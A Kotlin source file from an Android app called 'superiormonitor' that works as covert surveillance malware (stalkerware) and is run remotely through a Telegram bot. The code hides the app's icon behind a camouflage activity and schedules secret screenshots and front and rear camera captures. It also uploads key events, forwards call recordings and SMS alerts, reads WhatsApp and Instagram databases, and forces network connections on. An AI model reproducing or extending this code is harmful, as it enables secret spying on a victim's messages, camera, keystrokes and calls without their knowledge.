package com.system.superiormonitor.bot

import com.system.superiormonitor.core.LogLevel

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import com.system.superiormonitor.MainActivity
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object BotActions {

    fun openApplication(context: Context): String {
        val intent = Intent(context, MainActivity::class.java).apply {
            action = Intent.ACTION_MAIN
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        context.startActivity(intent)
        return "*Application opened successfully*"
    }

    fun unhideApplication(context: Context): String {
        val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
        val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
        context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
        context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        return "*Application unhidden successfully*"
    }

    fun hideApplication(context: Context): String {
        val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
        val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
        return try {
            context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            "*Application completely hidden successfully*"
        } catch (e: Exception) {
            context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            "*Application partially hidden (OS restricted complete hide)*"
        }
    }

    fun showDevicePopup(context: Context, text: String) {
        val intent = Intent(context, com.system.superiormonitor.core.PopupActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("POPUP_MESSAGE", text)
        }
        context.startActivity(intent)
    }

    fun updateSnapshotFeatureState(context: Context, data: String): Boolean {
        val prefs = PrefsManager.getInstance(context)
        val parts = data.split("_")
        // Expected format: set_snap_{feature}_{interval|disable}
        if (parts.size < 4) return false
        
        val feature = parts[2]
        val action = parts[3]
        
        val scheduler = com.system.superiormonitor.monitor.SnapshotScheduler(context)
        when (feature) {
            "screen" -> {
                if (action == "disable") {
                    if (!prefs.enableSnapshots) return false
                    prefs.enableSnapshots = false
                    scheduler.cancelSnapshot()
                } else {
                    val interval = action.toIntOrNull()
                    if (interval != null) {
                        if (prefs.enableSnapshots && prefs.snapshotIntervalMin == interval) return false
                        prefs.enableSnapshots = true
                        prefs.snapshotIntervalMin = interval
                        scheduler.scheduleNextSnapshot()
                    }
                }
            }
            "front" -> {
                if (action == "disable") {
                    if (!prefs.enableFrontCamera) return false
                    prefs.enableFrontCamera = false
                    scheduler.cancelCamera(1)
                } else {
                    val interval = action.toIntOrNull()
                    if (interval != null) {
                        if (prefs.enableFrontCamera && prefs.frontCameraInterval == interval) return false
                        prefs.enableFrontCamera = true
                        prefs.frontCameraInterval = interval
                        scheduler.scheduleNextCamera(1)
                    }
                }
            }
            "rear" -> {
                if (action == "disable") {
                    if (!prefs.enableRearCamera) return false
                    prefs.enableRearCamera = false
                    scheduler.cancelCamera(0)
                } else {
                    val interval = action.toIntOrNull()
                    if (interval != null) {
                        if (prefs.enableRearCamera && prefs.rearCameraInterval == interval) return false
                        prefs.enableRearCamera = true
                        prefs.rearCameraInterval = interval
                        scheduler.scheduleNextCamera(0)
                    }
                }
            }
        }
        return true
    }

    fun updateKeyEventsFeatureState(context: Context, data: String): Boolean {
        val prefs = PrefsManager.getInstance(context)
        val parts = data.split("_")
        // Expected format: set_key_events_{interval|disable}
        if (parts.size < 4) return false
        
        val action = parts[3]
        val scheduler = com.system.superiormonitor.monitor.KeyEventScheduler(context)
        
        if (action == "disable") {
            if (!prefs.keyEventsEnabled) return false
            prefs.keyEventsEnabled = false
            scheduler.cancelKeyEventUpload()
        } else {
            val interval = action.toIntOrNull()
            if (interval != null) {
                if (prefs.keyEventsEnabled && prefs.keyEventsIntervalMin == interval) return false
                prefs.keyEventsEnabled = true
                prefs.keyEventsIntervalMin = interval
                scheduler.scheduleNextKeyEventUpload()
            }
        }
        return true
    }

    fun togglePersistentFeature(context: Context, data: String) {
        val prefs = PrefsManager.getInstance(context)
        when (data) {
            "activate_persistent" -> prefs.persistentEnforcementEnabled = true
            "deactivate_persistent" -> {
                prefs.persistentEnforcementEnabled = false
                prefs.forceMobileData = false
                prefs.forceWifi = false
                prefs.forceHotspot = false
            }
            "toggle_force_data" -> prefs.forceMobileData = !prefs.forceMobileData
            "toggle_force_wifi" -> prefs.forceWifi = !prefs.forceWifi
            "toggle_force_hotspot" -> prefs.forceHotspot = !prefs.forceHotspot
        }
    }
    
    fun toggleBasicUpdateFeature(context: Context, data: String) {
        val prefs = PrefsManager.getInstance(context)
        when (data) {
            "toggle_call_rec" -> prefs.forwardRecordingEnabled = !prefs.forwardRecordingEnabled
            "toggle_call_events" -> prefs.callAlertsEnabled = !prefs.callAlertsEnabled
            "toggle_sms_events" -> prefs.smsAlertsEnabled = !prefs.smsAlertsEnabled
        }
    }
    
    fun toggleSocialUpdateFeature(context: Context, data: String, queryId: String) {
        val prefs = PrefsManager.getInstance(context)
        val token = prefs.botToken
        
        if (data == "toggle_whatsapp") {
            if (!prefs.whatsappUpdatesEnabled) {
                // We are trying to ENABLE it, run checks first.
                if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                    TelegramApi.answerCallbackQuery(token, queryId, "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature.", true)
                    return
                }
                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                if (!dbAvailable) {
                    TelegramApi.answerCallbackQuery(token, queryId, dbReason, true)
                    return
                }
                // All checks passed
                prefs.whatsappUpdatesEnabled = true
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_WHATSAPP" }
                context.startForegroundService(intent)
            } else {
                // Disabling it, no checks needed.
                prefs.whatsappUpdatesEnabled = false
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_WHATSAPP" }
                context.startForegroundService(intent)
            }
        } else if (data == "toggle_wabusiness") {
            if (!prefs.whatsappBusinessUpdatesEnabled) {
                // We are trying to ENABLE it, run checks first.
                if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                    TelegramApi.answerCallbackQuery(token, queryId, "WhatsApp Business is not installed on this device. Please install WhatsApp Business before enabling this feature.", true)
                    return
                }
                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                if (!dbAvailable) {
                    TelegramApi.answerCallbackQuery(token, queryId, dbReason, true)
                    return
                }
                // All checks passed
                prefs.whatsappBusinessUpdatesEnabled = true
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_WABUSINESS" }
                context.startForegroundService(intent)
            } else {
                // Disabling it, no checks needed.
                prefs.whatsappBusinessUpdatesEnabled = false
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_WABUSINESS" }
                context.startForegroundService(intent)
            }
        } else if (data == "toggle_instagram") {
            if (!prefs.instagramEnabled) {
                // We are trying to ENABLE it, run checks first.
                if (!com.system.superiormonitor.monitor.InstagramMonitor.isInstagramInstalled(context)) {
                    TelegramApi.answerCallbackQuery(token, queryId, "Instagram is not installed on this device. Please install Instagram before enabling this feature.", true)
                    return
                }
                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.InstagramMonitor.checkInstagramDatabase()
                if (!dbAvailable) {
                    TelegramApi.answerCallbackQuery(token, queryId, dbReason, true)
                    return
                }
                // All checks passed
                prefs.instagramEnabled = true
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_INSTAGRAM" }
                context.startForegroundService(intent)
            } else {
                // Disabling it, no checks needed.
                prefs.instagramEnabled = false
                val intent = android.content.Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_INSTAGRAM" }
                context.startForegroundService(intent)
            }
        }
    }

    fun toggleRecorderEngineFeature(context: Context, data: String) {
        val bcrPrefs = com.chiller3.bcr.Preferences(context)
        when (data) {
            "toggle_rec_telecom" -> bcrPrefs.recordTelecomApps = !bcrPrefs.recordTelecomApps
            "toggle_rec_dialing" -> bcrPrefs.recordDialingState = !bcrPrefs.recordDialingState
        }
    }

    fun setRecorderEngineValue(context: Context, data: String) {
        val bcrPrefs = com.chiller3.bcr.Preferences(context)
        when {
            data.startsWith("rec_set_source_") -> {
                val sourceName = data.substringAfter("rec_set_source_")
                val source = com.chiller3.bcr.format.AudioSource.entries.find { it.name == sourceName }
                if (source != null) bcrPrefs.audioSource = source
            }
            data.startsWith("rec_set_format_") -> {
                val formatName = data.substringAfter("rec_set_format_")
                val format = com.chiller3.bcr.format.Format.all.find { it.name == formatName }
                if (format != null) {
                    bcrPrefs.format = format
                    // Auto-adjust sample rate and param to nearest valid values for new format
                    val nearestSampleRate = bcrPrefs.getFormatSampleRate(format)?.let { format.sampleRateInfo.toNearest(it) }
                    if (nearestSampleRate != null) bcrPrefs.setFormatSampleRate(format, nearestSampleRate)
                    
                    val nearestParam = bcrPrefs.getFormatParam(format)?.let { format.paramInfo.toNearest(it) }
                    if (nearestParam != null) bcrPrefs.setFormatParam(format, nearestParam)
                }
            }
            data.startsWith("rec_set_samplerate_") -> {
                val rateStr = data.substringAfter("rec_set_samplerate_")
                val rate = rateStr.toUIntOrNull()
                val currentFormat = com.chiller3.bcr.format.Format.fromPreferences(bcrPrefs).format
                if (rate != null) {
                    bcrPrefs.setFormatSampleRate(currentFormat, rate)
                }
            }
            data.startsWith("rec_set_param_") -> {
                val paramStr = data.substringAfter("rec_set_param_")
                val param = paramStr.toUIntOrNull()
                val currentFormat = com.chiller3.bcr.format.Format.fromPreferences(bcrPrefs).format
                if (param != null) {
                    bcrPrefs.setFormatParam(currentFormat, param)
                }
            }
        }
    }



    // ═══════════════════════════════════════════════════════════
    //  AUTHORIZATION LOGIC
    // ═══════════════════════════════════════════════════════════

    fun handleUnauthorizedAccess(
        context: Context,
        scope: CoroutineScope,
        update: com.system.superiormonitor.data.Update,
        incomingUserId: String,
        incomingChatId: String,
        unauthorizedAccessAttempts: MutableMap<String, Int>
    ) {
        val currentPrefs = PrefsManager.getInstance(context)

        val isGroup = incomingChatId.startsWith("-")
        if (isGroup) {
            logUnauthorizedAccess(context, update, incomingChatId, incomingUserId, "Left the group chat")
            scope.launch(Dispatchers.IO) {
                TelegramApi.leaveChat(currentPrefs.botToken, incomingChatId)
            }
            return
        }

        // Direct Message
        val attempts = unauthorizedAccessAttempts.getOrDefault(incomingUserId, 0) + 1
        unauthorizedAccessAttempts[incomingUserId] = attempts

        when {
            attempts < 3 -> {
                logUnauthorizedAccess(context, update, incomingChatId, incomingUserId, "⏳ Awaiting 3 Access Attempts")
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]New user detected will be blocked after 3 failed attampts", LogLevel.ERROR)

                val warningMsg = BotMessages.Alerts.buildUnauthorizedWarningMessage()
                val markup = BotMarkups.Alerts.buildUnauthorizedMarkup()

                scope.launch(Dispatchers.IO) {
                    TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, warningMsg, replyMarkup = markup)
                }
            }
            attempts == 3 -> {
                logUnauthorizedAccess(context, update, incomingChatId, incomingUserId, "🚫 Blocked User from acessing")
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]User tried 3 failed acess attempt - blocked.", LogLevel.ERROR)

                val blockedMsg = BotMessages.Alerts.buildUnauthorizedBlockedMessage()
                val markup = BotMarkups.Alerts.buildUnauthorizedMarkup()

                scope.launch(Dispatchers.IO) {
                    TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, blockedMsg, replyMarkup = markup)
                }
            }
            else -> {
                // Silently ignore
            }
        }
    }

    private fun logUnauthorizedAccess(
        context: Context,
        update: com.system.superiormonitor.data.Update,
        incomingChatId: String,
        incomingUserId: String,
        action: String
    ) {
        val currentPrefs = PrefsManager.getInstance(context)
        val timeFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
        val accessTime = timeFormat.format(java.util.Date())
        
        val isGroup = incomingChatId.startsWith("-")
        val header = if (isGroup) "New Group Chat Detected" else "New User Acess Detected"
        
        val logMessage = buildString {
            append("*$header*\n")
            append("-------------------------\n")
            append("*Time* : $accessTime\n")
            append("*Action* : $action\n")
            
            if (isGroup) {
                val chatTitle = update.my_chat_member?.chat?.title ?: "Unknown Group"
                val adderName = update.my_chat_member?.from?.first_name ?: "Unknown"
                append("*Group Name* : $chatTitle\n")
                append("*Group ID* : `$incomingChatId`\n")
                append("*Added by* : $adderName (`$incomingUserId`)")
            } else {
                val name = update.message?.from?.first_name ?: update.callback_query?.from?.first_name ?: "Unknown"
                val username = update.message?.from?.username ?: update.callback_query?.from?.username ?: "None"
                val attemptText = if (action.contains("Blocked")) "3/3" else "1/3"
                append("*User Name* : $name\n")
                append("*Username* : @$username\n")
                append("*User ID* : `$incomingUserId`\n")
                append("*Attempts* : $attemptText")
            }
        }
        
        val username: String?
        val name: String
        
        if (isGroup) {
            val chat = update.message?.chat ?: update.my_chat_member?.chat
            username = chat?.username
            name = chat?.title ?: chat?.first_name ?: "Unknown Group"
        } else {
            val user = update.message?.from ?: update.callback_query?.from ?: update.my_chat_member?.from
            username = user?.username
            name = user?.first_name ?: "Unknown User"
        }
        
        val idLabel = if (isGroup) "Group id" else "User id"
        val nameLabel = if (isGroup) "Chatname" else "Name"
        
        val logLines = mutableListOf(
            header,
            "",
            "Time - $accessTime",
            "$idLabel - $incomingChatId"
        )
        if (username != null) {
            logLines.add("Username - @$username")
        }
        logLines.add("$nameLabel - $name")
        logLines.add("")
        logLines.add("Taken Action - $action")
        logLines.add("")
        logLines.add("--------------------------------------------------")
        logLines.add("")
        
        val logContent = logLines.joinToString("\n")
        
        try {
            val authDir = java.io.File(context.getExternalFilesDir(null), "authorization")
            if (!authDir.exists()) authDir.mkdirs()
            val logFile = java.io.File(authDir, "access.log")
            logFile.appendText(logContent)
        } catch (e: Exception) {
            android.util.Log.e("BotActions", "Failed to write authorization log", e)
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            TelegramApi.sendMessage(currentPrefs.botToken, currentPrefs.chatId, logMessage)
        }
    }


}
